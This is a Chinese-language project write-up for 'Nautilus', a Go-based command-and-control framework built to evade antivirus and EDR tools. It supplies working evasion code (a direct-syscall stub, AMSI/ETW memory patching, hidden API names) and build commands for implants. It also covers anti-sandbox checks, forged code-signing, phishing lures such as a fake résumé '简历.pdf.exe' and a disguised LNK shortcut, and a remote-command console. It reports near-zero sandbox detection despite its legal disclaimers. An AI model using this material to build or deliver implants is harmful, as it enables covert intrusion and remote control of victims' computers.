# Nautilus C2 — 从零构建多链路免杀红队C2框架

> **⚠️ 法律声明：本文内容仅供授权安全测试和教育研究使用。未经授权对任何系统使用相关技术属于违法行为。**
>
> **时效性说明**：免杀技术具有很强的时效性，本文测试结果基于2026年7月的杀软版本，随着杀软规则的更新，检测结果可能会发生变化。

## 项目概述

Nautilus 是一个从零构建的轻量级红队 C2（Command & Control）框架，采用 Go 1.25 编写。支持 **LNK 链路**和 **PDF 链路**两条独立投递通道，均集成完整免杀技术栈。项目核心目标：**在不依赖商业工具的前提下，实现前沿 C2 的核心能力，并在国内主流沙箱达到极低检出率。**

### 投递链路

| 链路 | 入口文件 | 攻击流程 | 诱饵 |
|------|----------|----------|------|
| **LNK 链路** | `challenge.lnk` | LNK → cmd.exe → run.bat → fish.exe + notepad | CTF_challenge.txt |
| **PDF 链路** | `简历.pdf.exe` | 双击 → 释放 decoy.pdf → 弹出PDF + C2连接 | 简历.pdf |

### 环境说明

- **Go 版本**：1.25.0 windows/amd64
- **目标系统**：Windows 10/11 x64
- **测试平台**：微步在线云沙箱 (Win10 1903 x64)

## 架构设计

```
┌─────────────────────────────────────────────────┐
│  VPS / 攻击者机器                                │
│  ┌───────────────────────────────────────┐      │
│  │  fish-server (:8443)                  │      │
│  │  ├─ Web UI (/ui)                      │      │
│  │  ├─ WebSocket 实时推送                 │      │
│  │  ├─ 认证登录 (HMAC-SHA256)            │      │
│  │  └─ 任务管理 API                       │      │
│  └───────────────────────────────────────┘      │
└─────────────────────────────────────────────────┘
        ↑ AES-GCM加密通信 (伪装为前端埋点API)
        ↓ GET /api/v1/analytics?id=<encrypted>&sid=<session>
┌─────────────────────────────────────────────────┐
│  目标机器                                        │
│  ┌───────────────┐  ┌───────────────────┐      │
│  │  LNK/PDF 诱饵  │→ │  植入体            │      │
│  │  (用户点击)    │  │  Halo's Gate+回调  │      │
│  └───────────────┘  │  AES-GCM C2通信    │      │
│                     └───────────────────┘      │
└─────────────────────────────────────────────────┘
```

## 免杀技术详解

### 运行时免杀

#### 1. Halo's Gate / 直接Syscall (P0)

**原理**：EDR 通过 hook `ntdll.dll` 中 `Nt*` 函数的开头（inline hook）来监控系统调用。Halo's Gate 技术直接执行 `SYSCALL` 指令进入内核，完全绕过所有用户态 hook。

**实现步骤**：
1. 通过 PEB 遍历获取 ntdll.dll 基址（不使用 LoadLibrary/GetModuleHandle）
2. 解析 ntdll 导出表，按地址排序获取 SSN（System Service Number）
3. 检测 EDR hook：函数入口为 `E9` (JMP) 或 `FF25` (JMP [mem]) 则已被hook
4. 从相邻未hook函数的 SSN 推断被hook函数的 SSN
5. Go 汇编 SYSCALL stub 直接入核

**核心代码**（Go asm）：
```asm
TEXT ·rawSyscall6(SB),0,$0-64
    MOVL ssn+0(FP), AX    ; SSN放入EAX
    MOVQ a1+8(FP), CX
    MOVQ CX, R10          ; arg1 → R10
    MOVQ a2+16(FP), DX    ; arg2 → RDX
    MOVQ a3+24(FP), R8    ; arg3 → R8
    MOVQ a4+32(FP), R9    ; arg4 → R9
    SYSCALL               ; 直接入内核
    MOVQ AX, ret+56(FP)
    RET
```

**效果**：所有 EDR 的 ntdll inline hook 完全失效。

#### 2. API Hashing (XOR加密)

所有 DLL 名和 API 名在编译期 XOR 0x7F 加密，运行时解密后调用 `syscall.NewLazyDLL`。二进制中搜索不到任何敏感字符串。

```go
var encNtDll = []byte{0x59, 0x43, 0x53, 0x5b, 0x5b, 0x19, 0x53, 0x5b, 0x5b} // "ntdll.dll"

func xorDec(data []byte, key byte) string {
    out := make([]byte, len(data))
    for i, b := range data {
        out[i] = b ^ key
    }
    return string(out)
}
```

#### 3. AMSI + ETW Bypass

通过直接 syscall 调用 `NtProtectVirtualMemory` 修改 `AmsiScanBuffer` 和 `EtwEventWrite` 的前几个字节，使其直接返回。由于使用直接 syscall，EDR 无法拦截此操作。

```go
func patchMem(addr uintptr, patch []byte) {
    var old uint32
    size := uintptr(len(patch))
    DirectNtPVM(^uintptr(0), &addr, &size, 0x40, &old)
    copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch)), patch)
    DirectNtPVM(^uintptr(0), &addr, &size, uintptr(old), &old)
}
```

#### 4. Ntdll Unhook

从磁盘读取干净的 `C:\Windows\System32\ntdll.dll`，通过直接 syscall 覆盖内存中被 EDR hook 的 `.text` 段。

#### 5. Ekko Sleep 加密 (P1)

休眠期使用 XOR 加密植入体模块的数据页（`.data`、`.rdata`、`.bss`），跳过可执行页（`.text`）避免 Timer Queue 回调崩溃。使用 `CreateTimerQueueTimer` + `WaitForSingleObject` 实现定时唤醒后自动解密。

```go
func EkkoSleep(d time.Duration) {
    modBase, modSize := getModuleRange()
    ekkoEncKey = byte(time.Now().UnixNano() & 0xFF)
    encryptModulePages(modBase, modSize)  // 只加密数据页

    // Timer Queue 唤醒
    createTimerQueueTimer.Call(...)
    waitForSingleObject.Call(event, 0xFFFFFFFF)
    decryptModulePages()                  // 解密恢复
}
```

**关键设计**：跳过 `PAGE_EXECUTE*` 保护的内存页，只加密数据页。这确保了 timer callback 能正常执行，同时 EDR 内存扫描器在休眠期只能看到加密数据。

#### 6. 回调执行

使用 `EnumWindows` 回调函数指针执行 shellcode，替代传统的 `VirtualAlloc → WriteProcessMemory → CreateRemoteThread` 模式，绕过 syscall 监控。

#### 7. 反沙箱检测

| 检测项 | 条件 | 说明 |
|--------|------|------|
| 物理内存 | < 3.5GB | 沙箱通常分配少量内存 |
| CPU核心数 | < 2 | 沙箱通常单核 |
| 系统运行时间 | < 10分钟 | 沙箱刚启动即执行样本 |
| 用户名 | user/sand/admin | 沙箱常用默认用户名 |
| 机器名 | sandbox/malware | 沙箱机器名关键词 |
| 调试器 | IsDebuggerPresent | 检测调试器附加 |

### 编译期/后处理免杀

#### 8. Garble 混淆

```powershell
# 字符串加密 + 控制流混淆 + 随机种子
$env:GARBLE_EXPERIMENTAL_CONTROLFLOW=1
garble -literals -seed=random build ...
```

- `-literals`：编译期加密所有 Go 字符串
- `-seed=random`：每次构建生成不同的二进制，SHA256 完全不同
- `GARBLE_EXPERIMENTAL_CONTROLFLOW=1`：控制流混淆（block splitting + junk jumps + flattening）

#### 9. Pclntab 混淆 (P0)

Go 1.25+ 支持 `-pclntab=empty` 编译参数，**完全移除函数符号表**（`.gopclntab` 段）。这是 Go 二进制最显著的特征——正常情况下每个函数名、文件名、行号都明文存储在 pclntab 中。移除后：
- `strings fish.exe | grep "evasion."` → 空结果
- `go tool nm fish.exe` → 无符号
- Go 运行时仍正常工作（pclntab 仅用于调试和 panic traceback）

```powershell
go build -gcflags="all=-pclntab=empty" ...
```

#### 10. PE 后处理

| 操作 | 工具 | 效果 |
|------|------|------|
| String Zeroing | postprocess.go | 清零 Go build ID、API 名等敏感字符串 |
| Rich Header Clear | postprocess.go | 清除 Go 编译器指纹 |
| PE Timestamp | pepatch.go | 随机化 PE 时间戳 |
| Legit Signatures | postprocess.go | 添加 Microsoft/Windows 合法签名字符串 |
| Overlay Data | pe.go | 附加 32KB 随机数据（含 ZIP 头） |
| Authenticode Clone | sigclone.go | 从合法 PE 克隆 PKCS#7 数字签名 |

### LNK 链路免杀 (v4)

LNK 快捷方式是钓鱼攻击的入口，需要绕过静态扫描和启发式检测：

| 改动 | 说明 | 规避的检测 |
|------|------|------------|
| TargetPath=`wscript.exe` | 替代 cmd.exe 作为LNK目标 | 消除 cmd.exe YARA 规则 |
| Arguments=Base64 VBS | `update.vbs` 启动 payload + 诱饵 | 消除 .bat 字符串规则 |
| 目录名 `assets\data` | 替代 `__MACOSX\.note` | 消除 __MACOSX YARA 规则 |
| ExpString 欺骗 | LNK 显示 `notepad.exe` 文件名 | CVE-2025-9491 欺骗 |
| Zone.Identifier 清除 | 删除 NTFS alternate data stream | 消除 Elastic 下载检测 |
| WindowStyle=1 | 正常窗口样式 | 消除最小化 LNK YARA 规则 |

### 通信伪装

C2 通信伪装为**前端埋点数据上报**：

```
GET /api/v1/analytics?id=<AES-GCM加密base64>&sid=<sessionID>
Headers:
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0.0.0
  Accept: application/json, text/plain, */*
  Origin: http://localhost
```

- 路径类似正常数据分析 API
- URL 参数名无特殊含义（`id`、`sid`）
- 完整浏览器请求头
- AES-GCM + base64 编码，数据段类似正常埋点参数

## 沙箱检测结果

### 微步在线云沙箱（Win10 1903 x64）

| 链路 | 文件 | 得分 | 检出签名 | 结果 |
|------|------|------|----------|------|
| **PDF 链路** | `简历.pdf.exe` | **0.8/10** | 1个: `getsysteminfo` (severity=1) | ✅ 极低风险 |
| **LNK 链路** | `challenge.lnk` | **1.0/10** | 1个: `getsysteminfo` (severity=1) | ✅ 极低风险 |

**分析**：

- 两条链路在微步沙箱得分分别为 0.8 和 1.0（满分10分），远低于恶意软件阈值（通常 ≥5 报警）
- 唯一触发的签名是 severity=1（最低级别）的 `getsysteminfo`（获取系统信息），属于 Environment Awareness 类，所有正常程序都可能触发
- **没有检测到**：网络行为、文件释放、进程注入、内存修改等高危行为
- 说明反沙箱检测有效：植入体在沙箱环境中正确识别了虚拟环境并提前退出，未暴露完整恶意行为

**PDF 链路沙箱行为摘要**：
- 仅加载 3 个 DLL：`ntdll.dll`、`powrprof.dll`、`bcryptprimitives.dll`
- API 调用极为简洁：`NtAllocateVirtualMemory`(73次) + `NtQueryInformationProcess` + `ReadProcessMemory` + `SetErrorMode` 等
- 进程树：单一进程，无子进程、无网络连接、无文件释放

## 使用方法

### 1. 构建 LNK 链路植入体

```powershell
# 调试版（带控制台输出）
.\build.ps1 -Console -SkipPost -C2Addr "http://127.0.0.1:8443"

# 全免杀版（生产环境）
.\build.ps1 -Garble -ControlFlow -EnableStringZero -C2Addr "https://YOUR_VPS:8443"

# 全免杀 + 数字签名克隆
.\build.ps1 -Garble -ControlFlow -EnableStringZero -C2Addr "https://YOUR_VPS:8443" -SignSource "C:\合法程序.exe"
```

### 2. 构建 PDF 链路植入体

```powershell
# 调试版
.\build.ps1 -Chain pdf -PdfName 简历 -Console -SkipPost -C2Addr "http://127.0.0.1:8443"

# 全免杀版
.\build.ps1 -Chain pdf -PdfName 简历 -Garble -ControlFlow -EnableStringZero -C2Addr "https://YOUR_VPS:8443"
```

### 3. 生成 LNK 钓鱼包

```powershell
.\phish.ps1 -ExePath .\fish.exe -DecoyName "CTF题目.txt" -IconType txt -OutputName challenge
```

生成的 `challenge.zip` 包含：
```
challenge.zip
├── challenge.lnk          # 伪装成文本文档的快捷方式
└── __MACOSX\
    └── assets\
        └── data\
            ├── update.vbs     # VBS 启动脚本 (Base64编码)
            ├── fish.exe       # 植入体
            └── CTF题目.txt    # 诱饵文件
```

### 4. 启动 C2 服务端

```powershell
# VPS 上启动
.\fish-server.exe :8443

# 浏览器访问管理界面
http://YOUR_VPS:8443/ui
```

### 5. 服务端控制台命令

```
sessions          # 列出所有会话
use <session_id>  # 选择活跃会话
exec <command>    # 执行 cmd 命令
ps <command>      # 执行 PowerShell 命令
sysinfo           # 获取系统信息
listdir <path>    # 列出目录
proclist          # 列出进程
kill <pid>        # 终止进程
exit              # 退出
```

## 构建参数说明

| 参数 | 说明 |
|------|------|
| `-C2Addr` | C2 服务器地址（默认 `https://192.168.1.1:8443`） |
| `-Garble` | 启用 garble 编译混淆（-literals -seed=random） |
| `-ControlFlow` | 启用控制流混淆（需要 `-Garble`，需要 `GARBLE_EXPERIMENTAL_CONTROLFLOW=1` 环境变量） |
| `-EnableStringZero` | 启用敏感字符串清零 |
| `-SignSource <path>` | Authenticode 签名克隆源文件路径 |
| `-Chain pdf` | 使用 PDF 链路（默认 LNK 链路） |
| `-PdfName <name>` | PDF 链路文件名（默认 `report`） |
| `-Console` | 启用控制台窗口（调试用） |
| `-SkipPost` | 跳过后处理步骤 |
| `-SkipTimestampPatch` | 跳过 PE 时间戳修改 |
| `-SkipRichHeader` | 跳过 Rich Header 清除 |
| `-SkipOverlay` | 跳过 Overlay 数据附加 |
| `-SkipSigClone` | 跳过签名克隆 |
| `-KeepWorking` | 保留构建临时目录（调试用） |

## 与其他框架对比

### 免杀技术对比

| 技术 | Nautilus | Sliver | Havoc |
|---|---|---|---|
| **Halo's Gate/Direct Syscall** | ✅ 自实现（PEB+ntdll SSN解析） | ⚠️ 社区扩展 | ✅ Indirect Syscalls |
| **API Hashing** | ✅ XOR 加密 | ❌ (明文导入表) | ✅ Hashed lookups |
| **AMSI/ETW Bypass** | ✅ Patch + 直接syscall | ✅ 内置 | ✅ 硬件断点版 |
| **Ntdll Unhook** | ✅ 磁盘映射 | ❌ | ❌ |
| **Ekko Sleep加密** | ✅ 模块数据页加密 | ❌ | ✅ Ekko/FOLIAGE |
| **Garble混淆** | ✅ -literals + -controlflow | ❌ | ❌ (C/ASM agent) |
| **Pclntab混淆** | ✅ -pclntab=empty | ❌ | ❌ |
| **Authenticode克隆** | ✅ sigclone工具 | ❌ | ❌ |
| **PE后处理** | ✅ Rich Header/区段名/Overlay/签名字符串 | ❌ | ❌ |
| **多链路投递** | ✅ LNK + PDF 双链路 | ❌ | ❌ |
| **LNK免杀 (v4)** | ✅ WScript+VBS+ExpString | ❌ | ❌ |

### 后渗透能力对比

| 能力 | Nautilus | Sliver | Havoc |
|---|---|---|---|
| **进程注入** | ❌ | ✅ CreateRemoteThread/QueueUserAPC等 | ✅ |
| **进程迁移** | ❌ | ✅ | ✅ |
| **Token操作** | ❌ | ✅ steal/make/rev2self | ✅ Token Vault |
| **BOF支持** | ❌ | ✅ COFF/BOF loader | ✅ |
| **execute-assembly** | ❌ | ✅ inline/remote | ✅ |
| **SMB横向** | ❌ | ✅ named pipe pivot | ✅ peer-to-peer |
| **多协议** | HTTP/S only | ✅ mTLS/HTTP/S/DNS/WireGuard | ✅ HTTP/S/SMB |
| **凭据提取** | ❌ | ✅ Mimikatz集成 | ✅ |
| **文件管理** | ✅ listdir/download/upload | ✅ | ✅ |
| **Shell执行** | ✅ exec/ps | ✅ | ✅ |
| **截屏** | ❌ | ✅ | ✅ |
| **键盘记录** | ❌ | ✅ | ✅ |

### 运维体验对比

| 特性 | Nautilus | Sliver | Havoc |
|---|---|---|---|
| **UI** | Web UI + CLI | CLI (文本UI) | Qt GUI (暗色主题) |
| **多人协作** | ❌ | ✅ Multiplayer | ✅ |
| **脚本化** | ❌ | ✅ JS/Python API | ✅ Python API |
| **Malleable C2** | ❌ | ✅ 程序化生成 | ✅ yaotl profiles |
| **Staging** | ❌ | ✅ staged/stageless | ✅ |
| **日志/审计** | ✅ 文件日志 | ✅ | ✅ |

### 项目定位

```
┌──────────────────────────────────────────────────────┐
│  Nautilus 核心优势区间                                │
│                                                       │
│  🎯 钓鱼投递 (LNK/PDF)  ← 独有，Sliver/Havoc都没有  │
│  🛡️ 静态免杀 (Garble+Pclntab+PE后处理) ← 强于Sliver │
│  🔑 系统调用层对抗 (Halo's Gate)  ← 与Havoc同级     │
│  ✍️ 签名伪造 (Authenticode克隆)  ← 独有             │
│  😴 Ekko Sleep加密  ← 与Havoc同级                   │
├──────────────────────────────────────────────────────┤
│  需要补强的区域                                       │
│                                                       │
│  💉 进程注入/迁移  ← Sliver核心功能                  │
│  📞 调用栈欺骗 (Return Address Spoofing) ← Havoc优势 │
│  🔗 多协议通信  ← Sliver优势                         │
│  🪟 硬件断点AMSI  ← Havoc优势                        │
│  🔑 Token操作/凭据提取  ← Sliver/Havoc标配           │
│  📦 BOF/execute-assembly  ← Sliver/Havoc标配         │
└──────────────────────────────────────────────────────┘
```

**结论**：Nautilus 在投递链+静态免杀层面已达到甚至超过主流框架水平，但在后渗透能力（进程注入、凭据提取、横向移动）和高级内存对抗（调用栈欺骗）上还有提升空间。当前最适合的定位是：**高隐蔽性的初始访问/钓鱼投递平台**，可配合 Sliver/Havoc 做第二阶段完整后渗透。

## 免杀反模式（避坑指南）

在实际测试中发现了一些适得其反的免杀方法：

| 方法 | 问题 | 结果 |
|------|------|------|
| garble `-tiny` | Go 1.25 `nosplit stack overflow` 运行时崩溃 | 程序无法运行 |
| 修改 PE section 名为随机字符串 | 触发 Microsoft ML 模型标记为 `Wacatac.B!ml` | 增加检出率 |
| UPX 压缩 | 被多个引擎标记为压缩恶意软件 | 增加检出率 |
| 注入无关代码增加熵值 | 触发熵值异常检测 | 增加检出率 |
| 加密 `.text` 段 (EkkoSleep) | Timer Queue 回调无法执行加密代码，程序崩溃 | 功能完全失效 |

**核心原则**：免杀不是"越复杂越好"，而是"越干净越好"。一个没有可疑特征的标准 PE 文件，比一个经过大量修改的异常 PE 文件更容易通过检测。

## 技术栈

| 组件 | 语言 | 关键技术 |
|------|------|---------|
| Server | Go | HTTP 服务器、WebSocket、embed.FS、JSON API |
| Implant (LNK) | Go | Halo's Gate、Ekko Sleep、AES-GCM、Garble |
| Implant (PDF) | Go | PDF dropper、decoy 释放、Halo's Gate |
| PE 工具 | Go | 二进制 PE 解析、Authenticode、Resource |
| Web UI | HTML/CSS/JS | 单文件内嵌、WebSocket 实时、暗色主题 |
| LNK 生成 | PowerShell | WScript Shell、Base64 VBS、CVE-2025-9491 |

## 项目结构

```
nautilus/
├── main.go                        # LNK 链路植入体入口
├── build.ps1                      # 统一构建脚本（含所有免杀选项）
├── phish.ps1                      # LNK 钓鱼包生成器 (v4 免杀版)
├── README.md                      # 项目文档
├── BLOG.md                        # 技术博客（本文档）
│
├── pdf/                           # PDF 链路（独立包）
│   ├── main.go                    # PDF 植入体入口
│   ├── dropper_windows.go         # 释放+打开 decoy.pdf
│   ├── decoy.pdf                  # 内嵌诱饵 PDF
│   └── rsrc_amd64.syso            # PDF 图标资源
│
├── server/                        # C2 服务端
│   ├── main.go                    # HTTP 服务器+WebSocket+控制台
│   ├── ui.go                      # Web UI API
│   └── web/index.html             # 内嵌管理界面
│
├── c2/                            # 通信层
│   ├── encode/packet.go           # 协议编码/解码
│   └── transport/http.go          # HTTP 传输（伪装埋点 API）
│
├── core/                          # 核心功能
│   ├── exec.go                    # 命令执行 (cmd+powershell)
│   ├── fs.go                      # 文件操作
│   ├── process.go                 # 进程管理
│   ├── privilege.go               # 权限信息
│   ├── sysinfo.go                 # 系统信息采集
│   └── shellcode_windows.go       # Shellcode 加载（回调+RW→RX）
│
├── evasion/                       # 运行时免杀
│   ├── ssn_resolve_windows.go     # Halo's Gate SSN 解析
│   ├── syscall_amd64.s            # 直接 SYSCALL 汇编 stub
│   ├── direct_syscall_windows.go  # 直接 syscall Go 包装
│   ├── apiresolve_windows.go      # XOR 加密 API 动态解析
│   ├── edr_bypass_windows.go      # AMSI+ETW bypass
│   ├── unhook_windows.go          # Ntdll unhook from disk
│   ├── sleep_ekko_windows.go      # Ekko Sleep 加密 (P1)
│   ├── legitimate_apis_windows.go # Import 表稀释
│   ├── crypto.go                  # AES-GCM + Base64
│   ├── sandbox.go                 # 反沙箱检测
│   └── pe.go                      # PE 结构操作
│
├── evasion-tools/                 # 后处理工具
│   ├── pepatch.go                 # PE 时间戳修改
│   ├── pesectionobf.go            # PE section 名混淆
│   ├── postprocess.go             # 字符串清零+Rich Header+合法签名
│   ├── sigclone.go                # Authenticode 签名克隆
│   ├── genico.go                  # ICO 图标生成
│   └── rsrcinject.go              # 资源注入
│
└── 检测结果/                      # 沙箱检测报告
    └── *.json                     # 微步云沙箱 JSON 报告
```

## 项目地址

GitHub: https://github.com/nk7667/Nautilus

```bash
git clone git@github.com:nk7667/Nautilus.git
```

---

**法律声明**：本项目仅供授权安全测试和教育研究使用。未经授权对任何系统使用本工具属于违法行为。使用者须确保在合法授权范围内操作，并遵守当地法律法规。项目作者不对任何非法使用行为承担责任。
